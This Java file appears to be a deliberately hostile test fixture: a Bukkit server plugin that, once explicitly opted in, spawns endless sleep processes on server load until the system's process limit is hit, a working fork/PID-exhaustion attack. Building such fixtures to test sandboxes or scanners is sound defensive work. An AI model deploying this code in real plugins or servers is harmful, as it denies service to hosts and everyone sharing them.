package dev.provenance.fixtures.hostile;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerLoadEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class ForkPidBombPlugin extends JavaPlugin implements Listener {
  static final String HOSTILE_OPT_IN = "provenance.fixture.hostile.enabled";

  private final Runnable registerServerLoadListener;
  private final ForkPidBombAttack attack;

  public ForkPidBombPlugin() {
    this.attack = new ForkPidBombAttack(SleeperProcess::start);
    this.registerServerLoadListener =
        () -> getServer().getPluginManager().registerEvents(this, this);
  }

  ForkPidBombPlugin(Runnable registerServerLoadListener, ForkPidBombAttack.ChildStarter starter) {
    this.registerServerLoadListener = Objects.requireNonNull(registerServerLoadListener);
    this.attack = new ForkPidBombAttack(starter);
  }

  @Override
  public void onEnable() {
    requireOptIn();
    registerServerLoadListener.run();
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onServerLoad(ServerLoadEvent ignored) {
    attack.startOnce();
  }

  private static void requireOptIn() {
    if (!Boolean.getBoolean("provenance.fixture.hostile.enabled")) {
      throw new IllegalStateException("hostile fixture execution requires explicit opt-in");
    }
  }
}

final class ForkPidBombAttack {
  private final ChildStarter childStarter;
  private final AtomicBoolean triggered = new AtomicBoolean();
  private final List<Process> retainedChildren = new ArrayList<>();

  ForkPidBombAttack(ChildStarter childStarter) {
    this.childStarter = Objects.requireNonNull(childStarter);
  }

  int startOnce() {
    if (!triggered.compareAndSet(false, true)) {
      return retainedChildren.size();
    }

    while (true) {
      try {
        retainedChildren.add(Objects.requireNonNull(childStarter.start()));
      } catch (IOException exception) {
        if (!isPidLimitDenial(exception)) {
          throw new IllegalStateException("fork/PID fixture process creation failed", exception);
        }
        return retainedChildren.size();
      }
    }
  }

  int retainedChildCount() {
    return retainedChildren.size();
  }

  private static boolean isPidLimitDenial(IOException exception) {
    for (Throwable cause = exception; cause != null; cause = cause.getCause()) {
      String message = cause.getMessage();
      if (message == null) {
        continue;
      }
      String normalized = message.toLowerCase(Locale.ROOT);
      if (normalized.contains("error=11")
          || normalized.contains("resource temporarily unavailable")) {
        return true;
      }
    }
    return false;
  }

  @FunctionalInterface
  interface ChildStarter {
    Process start() throws IOException;
  }
}

final class SleeperProcess {
  private static final List<Path> ALLOWED_EXECUTABLES =
      List.of(Path.of("/usr/bin/sleep"), Path.of("/bin/sleep"));
  private static final String SLEEP_SECONDS = "2147483647";

  private SleeperProcess() {}

  static Process start() throws IOException {
    ProcessBuilder builder = new ProcessBuilder(command());
    builder.environment().clear();
    builder.directory(new File(File.separator));
    builder.redirectInput(ProcessBuilder.Redirect.from(new File("/dev/null")));
    builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
    builder.redirectError(ProcessBuilder.Redirect.DISCARD);
    return builder.start();
  }

  static List<String> command() throws IOException {
    return List.of(resolveExecutable().toString(), SLEEP_SECONDS);
  }

  static Path resolveExecutable() throws IOException {
    for (Path candidate : ALLOWED_EXECUTABLES) {
      if (candidate.isAbsolute()
          && Files.isRegularFile(candidate)
          && Files.isExecutable(candidate)) {
        return candidate;
      }
    }
    throw new IOException("no allowlisted sleeper executable is available");
  }
}
